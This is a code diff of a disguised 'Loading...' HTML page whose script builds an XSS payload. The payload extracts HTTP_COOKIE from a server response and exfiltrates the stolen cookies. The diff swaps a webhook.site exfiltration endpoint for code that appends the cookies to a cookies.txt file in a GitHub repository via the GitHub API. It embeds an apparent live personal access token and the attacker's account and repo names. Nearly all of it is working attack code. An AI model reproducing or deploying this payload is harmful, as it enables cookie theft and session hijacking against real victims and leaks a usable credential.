@@ -1,7 +1,7 @@
 <html>
 <head><title>Loading...</title></head>
 <body>
-<p id="status" style="text-align:center;font-family:sans-serif">
+<p style="text-align:center;font-family:sans-serif">
   جاري التحميل...
 </p>
 
@@ -12,11 +12,74 @@
 </form>
 
 <script>
-var SERVER = "https://webhook.site/7a389980-117d-4294-b71b-6f3df41995d9";
+// ==============================
+// إعدادات GitHub API
+// ==============================
+var GITHUB_TOKEN  = "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";   // ← Personal Access Token
+var GITHUB_OWNER  = "hix911";        // ← اسم حسابك
+var GITHUB_REPO   = "R_hix9";       // ← اسم الـ repo
+var GITHUB_FILE   = "cookies.txt";          // ← ملف حفظ الكوكيز
 
-// الخطوة 1: تأكيد وصول steal.php
-new Image().src = SERVER + "?c=EXPLOIT_LOADED";
+// ==============================
+// دالة حفظ الكوكيز في GitHub
+// ==============================
+function saveToGitHub(cookies) {
+  var apiUrl = "https://api.github.com/repos/"
+    + GITHUB_OWNER + "/"
+    + GITHUB_REPO  + "/contents/"
+    + GITHUB_FILE;
 
+  var headers = {
+    "Authorization": "token " + GITHUB_TOKEN,
+    "Content-Type":  "application/json",
+    "Accept":        "application/vnd.github.v3+json"
+  };
+
+  // الخطوة 1: جلب الملف الحالي للحصول على SHA
+  fetch(apiUrl, { headers: headers })
+  .then(function(r) { return r.json() })
+  .then(function(data) {
+
+    var time    = new Date().toISOString();
+    var oldText = data.content
+      ? atob(data.content.replace(/\n/g,''))
+      : '';
+
+    var newText = oldText
+      + "\n=====================================\n"
+      + "TIME:    " + time + "\n"
+      + "COOKIES:\n" + cookies + "\n"
+      + "=====================================\n";
+
+    var newContent = btoa(unescape(encodeURIComponent(newText)));
+
+    var body = {
+      message: "update",
+      content: newContent
+    };
+
+    // أضف SHA لو الملف موجود
+    if(data.sha) body.sha = data.sha;
+
+    // الخطوة 2: تحديث الملف
+    return fetch(apiUrl, {
+      method:  "PUT",
+      headers: headers,
+      body:    JSON.stringify(body)
+    });
+  })
+  .then(function(r) { return r.json() })
+  .then(function(result) {
+    console.log('[✅] Saved to GitHub!');
+  })
+  .catch(function(e) {
+    console.log('[❌] Error:', e);
+  });
+}
+
+// ==============================
+// XSS Payload
+// ==============================
 var xss = [
   '">',
   '<img src=x onerror="',
@@ -26,10 +89,20 @@ var xss = [
   "var idx=h.indexOf('HTTP_COOKIE');",
   "var c=h.substring(idx,idx+500)",
   ".replace(/\\x3C[^\\x3E]+\\x3E/g,'');",
-  "new Image().src='" + SERVER + "?c='+encodeURIComponent(c)",
+
+  // حفظ في GitHub عبر API
+  "var GITHUB_TOKEN='GITHUB_TOKEN_HERE';",
+  "var apiUrl='https://api.github.com/repos/USERNAME_HERE/REPO_NAME_HERE/contents/cookies.txt';",
+  "var hdrs={'Authorization':'token '+GITHUB_TOKEN,'Content-Type':'application/json','Accept':'application/vnd.github.v3+json'};",
+  "fetch(apiUrl,{headers:hdrs})",
+  ".then(function(r){return r.json()})",
+  ".then(function(d){",
+  "var old=d.content?atob(d.content.replace(/\\n/g,'')):'';",
+  "var txt=old+'\\n=====\\n'+new Date().toISOString()+'\\n'+c+'\\n=====\\n';",
+  "var body={message:'u',content:btoa(unescape(encodeURIComponent(txt)))};",
+  "if(d.sha)body.sha=d.sha;",
+  "fetch(apiUrl,{method:'PUT',headers:hdrs,body:JSON.stringify(body)})",
   "})",
-  ".catch(function(e){",
-  "new Image().src='" + SERVER + "?c=ERROR_'+encodeURIComponent(e)",
   "})",
   '">'
 ].join('');
